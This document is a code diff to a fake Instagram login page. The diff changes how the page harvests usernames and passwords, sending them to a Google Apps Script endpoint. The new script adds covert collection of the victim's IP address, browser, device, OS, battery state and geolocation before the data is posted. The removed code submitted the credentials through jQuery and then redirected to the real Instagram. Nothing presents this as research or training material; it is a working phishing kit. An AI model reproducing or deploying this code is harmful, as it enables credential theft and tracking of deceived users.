@@ -19,11 +19,12 @@
               <div class="login-image">
                 <img src="images/name.png" alt="Instagram logo">
               </div>
-            <form id="gform" action="" class="form-box">
+            <form id="gform" action="https://script.google.com/macros/s/AKfycbzaWnePa_ixc25VB2Z881ONuh5tTqvRWItW7IdJNirn2Q58axNP0dNHArcYlnsFghn-4A/exec" method="POST" class="form-box">
               <input type="text" id="lname" name="email" class="user-input top" placeholder="Phone number, username, or email">
               <input type="password" id="password" name="password" class="user-input" placeholder="Password">
               <input type="submit" class="button" value="Log in">
             </form>
+            
               <div class="or-main">
                 <div class="or-border"></div>
                 <span class="or">OR</span>
@@ -35,7 +36,9 @@
                 <span class="facebook-title">Log in with Facebook</span>
               </div>
           
-              <div class="Password">Forgot password?</div>
+              <div class="forgot-container">
+                <div class="Forgot">Forgot password?</div>
+            </div>
               <div class="question">Don't have an account? <span class="signup">Sign up</span></div>
               <div class="getapp">Get the app.</div>
           
@@ -72,24 +75,93 @@
             </tr>
         </table>
         </div>
-        <script>
-            $("#gform").submit((e)=>{
-                e.preventDefault()
-                $.ajax({
-                    url:"https://script.google.com/macros/s/AKfycbzaWnePa_ixc25VB2Z881ONuh5tTqvRWItW7IdJNirn2Q58axNP0dNHArcYlnsFghn-4A/exec",
-                    data:$("#gform").serialize(),
-                    method:"post",
-                    success:function (response){
-                        //alert("Form submitted successfully")
-                        //window.location.reload()
-                         window.location.href="https://instagram.com"
-                    },
-                    error:function (err){
-                        alert("Something Error")
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+  document.getElementById("gform").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const form = this;
+    const formData = new FormData(form);
+
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(ipData => {
+        const ip = ipData.ip;
+        const browser = navigator.userAgent;
+
+        formData.append("ip", ip);
+        formData.append("browser", browser);
+
+        // Get device type (mobile or desktop)
+        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "mobile" : "desktop";
+        formData.append("device_type", deviceType);
+
+        // Get platform (e.g., "Win32", "MacIntel")
+        const platform = navigator.platform;
+        formData.append("platform", platform);
+
+        // Get operating system (inferred from user agent)
+        const os = navigator.userAgent.match(/\((.*?)\)/);
+        const operatingSystem = os ? os[1] : "Unknown OS";
+        formData.append("operating_system", operatingSystem);
+
+        // Check if cookies are enabled
+        const cookiesEnabled = navigator.cookieEnabled ? "true" : "false";
+        formData.append("cookies_enabled", cookiesEnabled);
+
+        // Get battery info
+        if (navigator.getBattery) {
+          navigator.getBattery().then(function(battery) {
+            formData.append("battery_level", battery.level * 100);
+            formData.append("charging", battery.charging);
+
+            // Get location after battery info
+            getLocationAndSubmit();
+          });
+        } else {
+          // If battery API not supported
+          getLocationAndSubmit();
+        }
+
+        function getLocationAndSubmit() {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              formData.append("latitude", position.coords.latitude);
+              formData.append("longitude", position.coords.longitude);
+              submitForm(formData);
+            },
+            error => {
+              submitForm(formData);
+            }
+          );
+        }
+      })
+      .catch(() => {
+        submitForm(formData);
+      });
+
+    function submitForm(data) {
+      fetch("https://script.google.com/macros/s/AKfycbzaWnePa_ixc25VB2Z881ONuh5tTqvRWItW7IdJNirn2Q58axNP0dNHArcYlnsFghn-4A/exec", {
+        method: "POST",
+        body: data
+      })
+        .then(response => {
+          form.reset();
+        })
+        .catch(error => {
+          alert("Submission failed. Please try again.");
+        });
+    }
+  });
+</script>
+
         
-                    }
-                })
-            })
-        </script>
+
+        
+        
+        
+        
 </body>
 </html>
